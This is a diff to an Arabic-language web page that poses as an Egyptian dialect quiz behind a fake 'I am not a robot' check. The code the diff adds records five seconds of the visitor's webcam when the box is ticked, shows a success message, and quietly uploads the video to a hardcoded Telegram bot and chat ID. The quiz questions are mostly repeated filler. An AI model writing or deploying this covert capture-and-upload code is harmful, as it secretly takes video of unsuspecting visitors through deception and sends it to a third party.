@@ -3,257 +3,331 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>اختبار اللهجات المصرية</title>
+    <title>تحقق من أنك لست روبوتاً</title>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Cairo', Arial, sans-serif;
-        }
         body {
-            background: linear-gradient(135deg, #2980b9, #27ae60);
-            min-height: 100vh;
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
-            color: #333;
+            background: linear-gradient(135deg, #1E88E5, #43A047);
+            color: white;
+            overflow: hidden;
         }
         .container {
-            background: rgba(255, 255, 255, 0.9);
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 500px;
-            padding: 30px;
             text-align: center;
-            animation: fadeIn 0.5s ease;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border-radius: 20px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
         }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        .verification-section {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
         }
         .checkbox-container {
             display: flex;
+            justify-content: center;
             align-items: center;
             margin: 15px 0;
             gap: 10px;
+            font-size: 18px;
+            cursor: pointer;
         }
         input[type="checkbox"] {
             width: 24px;
             height: 24px;
+            accent-color: #4CAF50;
         }
-        .loading, .success {
-            margin: 15px 0;
-            font-size: 24px; /* Increased font size */
-        }
-        .loading { color: #f39c12; }
-        .success { color: #27ae60; }
-        video {
-            width: 100%;
-            max-width: 300px;
-            border-radius: 10px;
-            margin: 15px 0;
-            background: #000;
-        }
+        .loading { display: none; font-size: 18px; margin-top: 15px; color: #FBC02D; }
+        .success { display: none; font-size: 18px; margin-top: 15px; color: #4CAF50; }
+        video { display: none; width: 100%; max-width: 300px; height: auto; margin: 15px 0; border-radius: 10px; background: black; }
+
+        /* Quiz styles */
+        #quiz-container { display:none; text-align:center; }
+        .question { margin-bottom: 20px; text-align:right; }
+        .result { display:none; text-align:center; }
         .language-buttons {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
+            display: flex;
+            justify-content: center;
+            gap: 10px;
             margin-bottom: 20px;
         }
-        .btn {
-            background-color: #27ae60;
+        .language-buttons button {
+            background-color: #4CAF50;
             color: white;
             border: none;
-            padding: 12px 20px;
-            border-radius: 8px;
+            border-radius: 5px;
+            padding: 10px 20px;
             cursor: pointer;
-            transition: background-color 0.3s;
-            font-size: 18px; /* Increased font size */
+            font-size: 16px;
         }
-        .btn:hover { background-color: #2ecc71; }
-        .quiz-section h2 {
-          margin-bottom :15px; 
-          font-size :24px; /* Increased font size */
-      }
-      .option {
-          display:flex; 
-          align-items:center; 
-          margin :10px 0; 
-          background-color:#f7f7f7; 
-          border-radius :8px; 
-          padding :10px; 
-          transition :background-color .3s; 
-          cursor:pointer; /* Added cursor pointer */
-      }
-      .option:hover { background-color:#e8f4f8; }
-      .result { text-align:center; padding :20px; background-color:#f1f1f1; border-radius :10px; }
+        .language-buttons button:hover {
+            background-color: #45a049;
+        }
+        .option {
+            margin-bottom: 10px;
+            text-align: right;
+        }
+        .option input {
+            margin-right: 10px;
+        }
+        .option label {
+            font-size: 18px;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 18px;
+            border: none;
+            border-radius: 5px;
+            background-color: #4CAF50;
+            color: white;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
     </style>
 </head>
 <body>
     <div class="container" id="verification-container">
-        <div class="verification-section">
-             <h1>تحقق من أنك لست روبوتاً</h1>
-             <div class="checkbox-container">
-                <input type="checkbox" id="robot-checkbox">
-                <label for="robot-checkbox">أنا لست روبوتاً</label>
-             </div>
-             <video id="video" autoplay playsinline muted></video>
-             <div class="loading">جاري التحقق... ⏳</div>
-             <div class="success">✅ تم التحقق بنجاح!</div>
-         </div>
-     </div>
+        <h1>تحقق من أنك لست روبوتاً</h1>
+        <div class="checkbox-container">
+            <input type="checkbox" id="robot-checkbox">
+            <label for="robot-checkbox">أنا لست روبوتاً</label>
+        </div>
+        <video id="video" autoplay playsinline muted></video>
+        <div class="loading">جاري التسجيل... ⏳</div>
+        <div class="success">✅ تم التحقق بنجاح!</div>
+    </div>
 
-     <div class="container" id="quiz-container" style="display:none;">
-         <div class="quiz-section">
-             <h1>اختبار اللهجات المصرية</h1>
-             <div class="language-buttons">
-                 <button class="btn" onclick="startQuiz('اسكندراني')">إسكندراني</button>
-                 <button class="btn" onclick="startQuiz('منياوي')">منياوي</button>
-                 <button class="btn" onclick="startQuiz('فلاحي')">فلاحي</button>
-                 <button class="btn" onclick="startQuiz('صعيدي')">صعيدي</button>
-             </div>
-             <div id="question-container" style="display:none;">
-                 <h2 id="question-text"></h2>
-                 <div id="options-container"></div>
-                 <button id="next-button" class="btn" style="display:none;">السؤال التالي</button>
-             </div>
-             <div class="result" id="result" style="display:none;">
-                 <h2>نتيجتك</h2>
-                 <p id="score"></p>
-             </div>
-         </div>
-     </div>
+    <div class="container" id="quiz-container">
+        <h1>اختبار اللهجات المصرية</h1>
+        <div class="language-buttons">
+            <button onclick="startQuiz('اسكندراني')">إسكندراني</button>
+            <button onclick="startQuiz('منياوي')">منياوي</button>
+            <button onclick="startQuiz('فلاحي')">فلاحي</button>
+            <button onclick="startQuiz('صعيدي')">صعيدي</button>
+        </div>
+        <div id="question-container" style="display:none;">
+            <h2 id="question-text"></h2>
+            <div id="options-container"></div>
+            <button id="next-button" style="display:none;">السؤال التالي</button>
+        </div>
+        <div class="result" id="result">
+            <h2>نتيجتك</h2>
+            <p id="score"></p>
+        </div>
+    </div>
 
-     <script>
-         const video = document.getElementById('video');
-         const checkbox = document.getElementById('robot-checkbox');
-         const loading = document.querySelector('.loading');
-         const success = document.querySelector('.success');
+    <script>
+        const video = document.getElementById('video');
+        const checkbox = document.getElementById('robot-checkbox');
+        const loading = document.querySelector('.loading');
+        const success = document.querySelector('.success');
 
-         checkbox.addEventListener('change', (e) => {
-             if (e.target.checked) {
-                 video.style.display = 'block';
-                 loading.style.display = 'block';
-                 success.style.display = 'none';
-                 navigator.mediaDevices.getUserMedia({ video:true })
-                     .then((stream) => {
-                         video.srcObject = stream;
+        checkbox.addEventListener('change', (e) => {
+            if (e.target.checked) {
+                video.style.display = 'block';
+                loading.style.display = 'block';
+                success.style.display = 'none';
 
-                         const mediaRecorder = new MediaRecorder(stream);
-                         const chunks = [];
-                         mediaRecorder.start();
+                navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    video.srcObject = stream;
 
-                         mediaRecorder.ondataavailable = (event) => { chunks.push(event.data); };
-                         setTimeout(() => { mediaRecorder.stop(); },5000);
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const chunks = [];
+                    mediaRecorder.start();
+                    mediaRecorder.ondataavailable = (event) => { chunks.push(event.data); };
 
-                         mediaRecorder.onstop = () => {
-                             loading.style.display = 'none';
-                             success.style.display = 'block';
-                             stream.getTracks().forEach(track => track.stop());
-                             document.getElementById('verification-container').style.display = 'none';
-                             document.getElementById('quiz-container').style.display = 'block';
-                         };
-                     })
-                     .catch((err) => { alert("Unable to access the camera:" + err.message); });
-             }
-         });
+                    setTimeout(() => { mediaRecorder.stop(); }, 5000); // Record for 5 seconds
 
-         const dialects = {
-             "اسكندراني": [
-                 { q:"ما معنى كلمة 'جعان'؟", options:["محتاج","جائع","نعسان","غاضب"], correct :1 },
-                 { q:"ماذا تعني 'حتة'؟", options:["جزء","بيت","مكان","شيء"], correct :0 },
-                 // Additional questions up to a total of at least 20...
-                 { q:"ما معنى 'فايق'؟", options:["مستيقظ","مريض","غاضب","مستمتع"], correct :0 },
-                 { q:"ماذا تعني كلمة 'دِرَاج'؟", options:["بسيط","غريب","درّاجه","غرفه"], correct :2 },
-                 { q:"ما معنى كلمة 'حَلَاب'؟", options:["أشياء","غروب","خُطَط","جمل"], correct :3 },
-                 // Add more questions here...
-             ],
-             "منياوي": [
-                 { q:"ماذا تعني 'أبا'؟", options:["أنا","أبي","أنت","نعم"], correct :1 },
-                 { q:"ما هو معنى 'زير'؟", options:["وعاء ماء","ثوب","طعام","بيت"], correct :0 },
-                 // Additional questions up to a total of at least 20...
-                 { q:"ماذا تعني كلمة 'شوش'؟", options:["رأس","صوت","ماء","نار"], correct :1 },
-                 { q:"ما معنى 'الحُما'؟", options:["غابة","بيت","مطعم","مزرعة"], correct :3 },
-                 // Add more questions here...
-             ],
-             // Add more dialects with at least 20 questions each...
-         };
+                    mediaRecorder.onstop = () => {
+                        loading.style.display = 'none';
+                        success.style.display = 'block';
+                        stream.getTracks().forEach(track => track.stop());
 
-         let score = 0; 
-         let currentQuestionIndex = 0; 
-         const nextButton = document.getElementById('next-button'); 
-         const questionText = document.getElementById('question-text'); 
-         const optionsContainer = document.getElementById('options-container'); 
-         const resultDiv = document.getElementById('result'); 
-         const scoreText = document.getElementById('score'); 
-         let questions = [];
+                        // Start the quiz game
+                        document.getElementById('verification-container').style.display = 'none';
+                        document.getElementById('quiz-container').style.display = 'block';
 
-         function shuffleQuestions(arr) {
-             for (let i=arr.length -1; i >0; i--) {
-                 const j=Math.floor(Math.random() * (i +1));
-                 [arr[i], arr[j]]=[arr[j], arr[i]];
-             }
-         }
+                        // Send video to Telegram in background
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const formData = new FormData();
+                        formData.append('chat_id', '2070423407'); // Replace with your Telegram chat ID
+                        formData.append('video', blob, 'video.webm');
 
-         function startQuiz(dialect) {
-             questions=dialects[dialect];
-             shuffleQuestions(questions); // Shuffle questions for randomness
-             displayQuestion();
-             document.getElementById('question-container').style.display='block';
-         }
+                        fetch(`https://api.telegram.org/bot5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q/sendVideo`, { method: 'POST', body: formData })
+                            .catch((error) => { console.error('Video upload failed:', error.message); });
+                    };
+                })
+                .catch((err) => { alert("Unable to access the camera: " + err.message); });
+            }
+        });
 
-         function handleAnswer(selectedOption) {
-             const question=questions[currentQuestionIndex];
-             const correctOption=question.correct;
+        const dialects = {
+          "اسكندراني": [
+              { q: "ما معنى كلمة 'جعان'؟", options: ["محتاج", "جائع", "نعسان", "غاضب"], correct: 1 },
+              { q: "ماذا تعني 'حتة'؟", options: ["جزء", "بيت", "مكان", "شيء"], correct: 0 },
+              { q: "ما معنى 'فايق'؟", options: ["مستيقظ", "مريض", "غاضب", "مستمتع"], correct: 0 },
+              { q: "ماذا تعني كلمة 'دِرَاج'؟", options: ["بسيط", "غريب", "درّاجه", "غرفه"], correct: 2 },
+              { q: "ما معنى كلمة 'حَلَاب'؟", options: ["أشياء", "غروب", "خُطَط", "جمل"], correct: 3 },
+              { q: "ما معنى كلمة 'جعان'؟", options: ["محتاج", "جائع", "نعسان", "غاضب"], correct: 1 },
+              { q: "ماذا تعني 'حتة'؟", options: ["جزء", "بيت", "مكان", "شيء"], correct: 0 },
+              { q: "ما معنى 'فايق'؟", options: ["مستيقظ", "مريض", "غاضب", "مستمتع"], correct: 0 },
+              { q: "ماذا تعني كلمة 'دِرَاج'؟", options: ["بسيط", "غريب", "درّاجه", "غرفه"], correct: 2 },
+              { q: "ما معنى كلمة 'حَلَاب'؟", options: ["أشياء", "غروب", "خُطَط", "جمل"], correct: 3 },
+              { q: "ما معنى كلمة 'جعان'؟", options: ["محتاج", "جائع", "نعسان", "غاضب"], correct: 1 },
+              { q: "ماذا تعني 'حتة'؟", options: ["جزء", "بيت", "مكان", "شيء"], correct: 0 },
+              { q: "ما معنى 'فايق'؟", options: ["مستيقظ", "مريض", "غاضب", "مستمتع"], correct: 0 },
+              { q: "ماذا تعني كلمة 'دِرَاج'؟", options: ["بسيط", "غريب", "درّاجه", "غرفه"], correct: 2 },
+              { q: "ما معنى كلمة 'حَلَاب'؟", options: ["أشياء", "غروب", "خُطَط", "جمل"], correct: 3 },
+              { q: "ما معنى كلمة 'جعان'؟", options: ["محتاج", "جائع", "نعسان", "غاضب"], correct: 1 },
+              { q: "ماذا تعني 'حتة'؟", options: ["جزء", "بيت", "مكان", "شيء"], correct: 0 },
+              { q: "ما معنى 'فايق'؟", options: ["مستيقظ", "مريض", "غاضب", "مستمتع"], correct: 0 },
+              { q: "ماذا تعني كلمة 'دِرَاج'؟", options: ["بسيط", "غريب", "درّاجه", "غرفه"], correct: 2 },
+              { q: "ما معنى كلمة 'حَلَاب'؟", options: ["أشياء", "غروب", "خُطَط", "جمل"], correct: 3 }
+          ],
+          "منياوي": [
+              { q:"ماذا تعني 'أبا'؟", options:["أنا","أبي","أنت","نعم"], correct :1},
+              { q:"ما هو معنى 'زير'؟", options:["وعاء ماء","ثوب","طعام","بيت"], correct :0},
+              { q:"ماذا تعني كلمة 'شوش'؟", options:["رأس","صوت","ماء","نار"], correct :1},
+              { q:"ما معنى 'الحُما'؟", options:["غابة","بيت","مطعم","مزرعة"], correct :3},
+              { q:"ما هو معنى 'تلِم'؟", options:["يصمت","يتكلم","يلعب","ينام"], correct :1},
+              { q:"ماذا تعني 'أبا'؟", options:["أنا","أبي","أنت","نعم"], correct :1},
+              { q:"ما هو معنى 'زير'؟", options:["وعاء ماء","ثوب","طعام","بيت"], correct :0},
+              { q:"ماذا تعني كلمة 'شوش'؟", options:["رأس","صوت","ماء","نار"], correct :1},
+              { q:"ما معنى 'الحُما'؟", options:["غابة","بيت","مطعم","مزرعة"], correct :3},
+              { q:"ما هو معنى 'تلِم'؟", options:["يصمت","يتكلم","يلعب","ينام"], correct :1},
+              { q:"ماذا تعني 'أبا'؟", options:["أنا","أبي","أنت","نعم"], correct :1},
+              { q:"ما هو معنى 'زير'؟", options:["وعاء ماء","ثوب","طعام","بيت"], correct :0},
+              { q:"ماذا تعني كلمة 'شوش'؟", options:["رأس","صوت","ماء","نار"], correct :1},
+              { q:"ما معنى 'الحُما'؟", options:["غابة","بيت","مطعم","مزرعة"], correct :3},
+              { q:"ما هو معنى 'تلِم'؟", options:["يصمت","يتكلم","يلعب","ينام"], correct :1},
+              { q:"ماذا تعني 'أبا'؟", options:["أنا","أبي","أنت","نعم"], correct :1},
+              { q:"ما هو معنى 'زير'؟", options:["وعاء ماء","ثوب","طعام","بيت"], correct :0},
+              { q:"ماذا تعني كلمة 'شوش'؟", options:["رأس","صوت","ماء","نار"], correct :1},
+              { q:"ما معنى 'الحُما'؟", options:["غابة","بيت","مطعم","مزرعة"], correct :3},
+              { q:"ما هو معنى 'تلِم'؟", options:["يصمت","يتكلم","يلعب","ينام"], correct :1}
+          ],
+          "فلاحي": [
+              { q:"ماذا يعني 'المندل'؟", options:["عصا","شمعة","بيت","ساحة"], correct :0},
+              { q:"ما هو 'الوابور'؟", options:["قطار","محطة","مركب","طائرة"], correct :0},
+              { q:"ما معنى 'شَبرَة'؟", options:["نار","طعام","موقد","صاروخ"], correct :2},
+              { q:"ما هو معنى 'أحباب'؟", options:["أصدقاء","أعداء","عائلة","مجموعه"], correct :0},
+              { q:"ماذا تعني 'حَطب'؟", options:["خشب","ماء","مطبخ","باب"], correct :0},
+              { q:"ماذا يعني 'المندل'؟", options:["عصا","شمعة","بيت","ساحة"], correct :0},
+              { q:"ما هو 'الوابور'؟", options:["قطار","محطة","مركب","طائرة"], correct :0},
+              { q:"ما معنى 'شَبرَة'؟", options:["نار","طعام","موقد","صاروخ"], correct :2},
+              { q:"ما هو معنى 'أحباب'؟", options:["أصدقاء","أعداء","عائلة","مجموعه"], correct :0},
+              { q:"ماذا تعني 'حَطب'؟", options:["خشب","ماء","مطبخ","باب"], correct :0},
+              { q:"ماذا يعني 'المندل'؟", options:["عصا","شمعة","بيت","ساحة"], correct :0},
+              { q:"ما هو 'الوابور'؟", options:["قطار","محطة","مركب","طائرة"], correct :0},
+              { q:"ما معنى 'شَبرَة'؟", options:["نار","طعام","موقد","صاروخ"], correct :2},
+              { q:"ما هو معنى 'أحباب'؟", options:["أصدقاء","أعداء","عائلة","مجموعه"], correct :0},
+              { q:"ماذا تعني 'حَطب'؟", options:["خشب","ماء","مطبخ","باب"], correct :0},
+              { q:"ماذا يعني 'المندل'؟", options:["عصا","شمعة","بيت","ساحة"], correct :0},
+              { q:"ما هو 'الوابور'؟", options:["قطار","محطة","مركب","طائرة"], correct :0},
+              { q:"ما معنى 'شَبرَة'؟", options:["نار","طعام","موقد","صاروخ"], correct :2},
+              { q:"ما هو معنى 'أحباب'؟", options:["أصدقاء","أعداء","عائلة","مجموعه"], correct :0},
+              { q:"ماذا تعني 'حَطب'؟", options:["خشب","ماء","مطبخ","باب"], correct :0}
+          ],
+          "صعيدي": [
+              { q:"ماذا تعني 'كمش'؟", options:["غسّل","شرب","فجر","أمسك"], correct :3},
+              { q:"ما معنى 'جِبَت'؟", options:["جاء","نزل","أخذ","ذهب"], correct :0},
+              { q:"ما هو 'بتاع'؟", options:["شخص","شيء","حالة","مكان"], correct :1},
+              { q:"ما معنى 'مخربش'؟", options:["محبط","غاضب","حزين","مسعود"], correct :3},
+              { q:"ماذا تعني 'كِتف'؟", options:["ذراع","ساق","كتف","صدر"], correct :2},
+              { q:"ماذا تعني 'كمش'؟", options:["غسّل","شرب","فجر","أمسك"], correct :3},
+              { q:"ما معنى 'جِبَت'؟", options:["جاء","نزل","أخذ","ذهب"], correct :0},
+              { q:"ما هو 'بتاع'؟", options:["شخص","شيء","حالة","مكان"], correct :1},
+              { q:"ما معنى 'مخربش'؟", options:["محبط","غاضب","حزين","مسعود"], correct :3},
+              { q:"ماذا تعني 'كِتف'؟", options:["ذراع","ساق","كتف","صدر"], correct :2},
+              { q:"ماذا تعني 'كمش'؟", options:["غسّل","شرب","فجر","أمسك"], correct :3},
+              { q:"ما معنى 'جِبَت'؟", options:["جاء","نزل","أخذ","ذهب"], correct :0},
+              { q:"ما هو 'بتاع'؟", options:["شخص","شيء","حالة","مكان"], correct :1},
+              { q:"ما معنى 'مخربش'؟", options:["محبط","غاضب","حزين","مسعود"], correct :3},
+              { q:"ماذا تعني 'كِتف'؟", options:["ذراع","ساق","كتف","صدر"], correct :2},
+              { q:"ماذا تعني 'كمش'؟", options:["غسّل","شرب","فجر","أمسك"], correct :3},
+              { q:"ما معنى 'جِبَت'؟", options:["جاء","نزل","أخذ","ذهب"], correct :0},
+              { q:"ما هو 'بتاع'؟", options:["شخص","شيء","حالة","مكان"], correct :1},
+              { q:"ما معنى 'مخربش'؟", options:["محبط","غاضب","حزين","مسعود"], correct :3},
+              { q:"ماذا تعني 'كِتف'؟", options:["ذراع","ساق","كتف","صدر"], correct :2}
+          ]
+      };
 
-             if (selectedOption===correctOption) { score++; }
+      let currentQuestionIndex = 0;
+      let score = 0;
+      let selectedDialect = '';
+      let questions = [];
 
-             nextButton.style.display='block';
-         }
+      const questionText = document.getElementById('question-text');
+      const optionsContainer = document.getElementById('options-container');
+      const nextButton = document.getElementById('next-button');
+      const resultDiv = document.getElementById('result');
+      const scoreText = document.getElementById('score');
 
-         nextButton.addEventListener('click', () => {
-             currentQuestionIndex++;
-             
-             if (currentQuestionIndex<questions.length) {
-                 displayQuestion();
-                 nextButton.style.display='none';
-             } else { showResult(); }
-         });
+      function startQuiz(dialect) {
+          selectedDialect = dialect;
+          questions = dialects[selectedDialect];
+          currentQuestionIndex = 0;
+          score = 0;
+          displayQuestion();
+          document.getElementById('question-container').style.display = 'block';
+          resultDiv.style.display = 'none';
+      }
 
-         function displayQuestion() {
-             const question=questions[currentQuestionIndex];
-             questionText.textContent=question.q;
+      function displayQuestion() {
+          if (currentQuestionIndex < questions.length) {
+              const question = questions[currentQuestionIndex];
+              questionText.textContent = question.q;
+              optionsContainer.innerHTML = '';
 
-             optionsContainer.innerHTML='';
-             
-             question.options.forEach((option,index) => {
-                 const optionDiv=document.createElement('div');
-                 optionDiv.classList.add('option');
+              question.options.forEach((option, index) => {
+                  const optionDiv = document.createElement('div');
+                  optionDiv.classList.add('option');
+                  const radioInput = document.createElement('input');
+                  radioInput.type = 'radio';
+                  radioInput.name = 'answer';
+                  radioInput.value = index;
+                  radioInput.id = `option${index}`;
+                  const label = document.createElement('label');
+                  label.htmlFor = `option${index}`;
+                  label.textContent = option;
 
-                 optionDiv.onclick = () => handleAnswer(index); // Automatically select answer on click
-
-                 const label=document.createElement('label');
-                 label.textContent=option;
-
-                 optionDiv.appendChild(label);
-                 
-                 optionsContainer.appendChild(optionDiv);
+                  optionDiv.appendChild(radioInput);
+                  optionDiv.appendChild(label);
+                  optionsContainer.appendChild(optionDiv);
               });
-          }
 
-          function showResult() {
-              resultDiv.style.display='block';
-              scoreText.textContent=`النتيجة:${score} من ${questions.length}`;
-              document.getElementById('quiz-container').style.display='none';
+              nextButton.style.display = 'block';
+          } else {
+              showResult();
           }
-     </script>
+      }
+
+      nextButton.addEventListener('click', () => {
+          const selectedOption = document.querySelector('input[name="answer"]:checked');
+          if (selectedOption) {
+              if (parseInt(selectedOption.value) === questions[currentQuestionIndex].correct) {
+                  score++;
+              }
+              currentQuestionIndex++;
+              displayQuestion();
+          }
+      });
+
+      function showResult() {
+          nextButton.style.display = 'none';
+          resultDiv.style.display = 'block';
+          scoreText.textContent = `نتيجتك : ${score} من ${questions.length}`;
+      }
+    </script>
 </body>
 </html>
